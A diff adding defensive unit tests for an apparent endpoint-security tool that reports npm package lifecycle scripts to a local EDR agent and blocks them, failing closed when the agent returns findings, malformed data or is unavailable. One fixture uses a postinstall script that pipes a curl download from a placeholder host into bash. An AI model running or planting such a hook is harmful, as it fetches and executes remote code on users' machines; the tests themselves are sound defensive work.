@@ -283,6 +283,123 @@ describe("package-manager lifecycle local EDR publishing", () => {
     expect(JSON.stringify(payload)).not.toContain("MY_RAW_SECRET");
   });
 
+  it("blocks package lifecycle scripts in enforcement mode when local EDR returns findings", async () => {
+    const fetchMock = vi.fn(async () => ({
+      ok: true,
+      json: async () => ({
+        findingCount: 1,
+        findings: [{ ruleId: "endpoint.package_script.risky_lifecycle" }],
+      }),
+    }));
+    vi.stubGlobal("fetch", fetchMock);
+
+    await expect(
+      publishPackageManagerLifecycleEventToLocalEdr(
+        {
+          now: new Date("2026-05-17T16:00:00.000Z"),
+          env: {
+            npm_lifecycle_event: "postinstall",
+            npm_lifecycle_script: "curl https://payload.example.invalid/install.sh | bash",
+            npm_package_name: "@acme/install-hook",
+            npm_config_user_agent: "npm/10.2.0 node/v24.0.0 darwin arm64",
+            npm_execpath: "/usr/local/lib/node_modules/npm/bin/npm-cli.js",
+            INIT_CWD: "/repo",
+          },
+        },
+        {
+          enabled: true,
+          token: "local-token",
+          agentUrl: "http://agent.test",
+          timeoutMs: 500,
+          packageLifecycleEnforcement: "block",
+        },
+      ),
+    ).rejects.toThrow(/blocked package script findings/i);
+  });
+
+  it("fails closed in package lifecycle enforcement mode on malformed local EDR responses", async () => {
+    const lifecycleInput = {
+      now: new Date("2026-05-17T16:00:10.000Z"),
+      env: {
+        npm_lifecycle_event: "postinstall",
+        npm_lifecycle_script: "node postinstall.js",
+        npm_package_name: "@acme/install-hook",
+        npm_config_user_agent: "npm/10.2.0 node/v24.0.0 darwin arm64",
+        npm_execpath: "/usr/local/lib/node_modules/npm/bin/npm-cli.js",
+        INIT_CWD: "/repo",
+      },
+    };
+    const config = {
+      enabled: true,
+      token: "local-token",
+      agentUrl: "http://agent.test",
+      timeoutMs: 500,
+      packageLifecycleEnforcement: "block" as const,
+    };
+
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async () => ({
+        ok: true,
+        json: async () => {
+          throw new SyntaxError("invalid json");
+        },
+      })),
+    );
+    await expect(
+      publishPackageManagerLifecycleEventToLocalEdr(lifecycleInput, config),
+    ).rejects.toThrow(/malformed local EDR response/i);
+
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async () => ({
+        ok: true,
+        json: async () => ({}),
+      })),
+    );
+    await expect(
+      publishPackageManagerLifecycleEventToLocalEdr(lifecycleInput, config),
+    ).rejects.toThrow(/unrecognized local EDR response/i);
+
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async () => ({
+        ok: true,
+        json: async () => ({ findingCount: 0 }),
+      })),
+    );
+    await expect(
+      publishPackageManagerLifecycleEventToLocalEdr(lifecycleInput, config),
+    ).resolves.toBeUndefined();
+  });
+
+  it("fails closed in package lifecycle enforcement mode when local EDR is unavailable", async () => {
+    await expect(
+      publishPackageManagerLifecycleEventToLocalEdr({
+        now: new Date("2026-05-17T16:00:00.000Z"),
+        env: {
+          CLAWDSTRIKE_PACKAGE_MANAGER: "npm",
+          npm_lifecycle_event: "postinstall",
+          npm_lifecycle_script: "node postinstall.js",
+          npm_package_name: "@acme/install-hook",
+          CLAWDSTRIKE_PACKAGE_LIFECYCLE_ENFORCEMENT: "block",
+        },
+      }),
+    ).rejects.toThrow(/local EDR is unavailable/i);
+  });
+
+  it("fails closed in package lifecycle enforcement mode when hook environment cannot be classified", async () => {
+    await expect(
+      publishPackageManagerLifecycleEventToLocalEdr({
+        now: new Date("2026-05-17T16:00:30.000Z"),
+        env: {
+          CLAWDSTRIKE_PACKAGE_LIFECYCLE_ENFORCEMENT: "block",
+          PATH: "/usr/bin",
+        },
+      }),
+    ).rejects.toThrow(/could not infer a package-manager lifecycle event/i);
+  });
+
   it("detects Bun lifecycle scripts from package-manager environment", async () => {
     const event = buildPackageManagerLifecycleEventFromEnvironmentForLocalEdr({
       now: new Date("2026-05-17T16:01:00.000Z"),
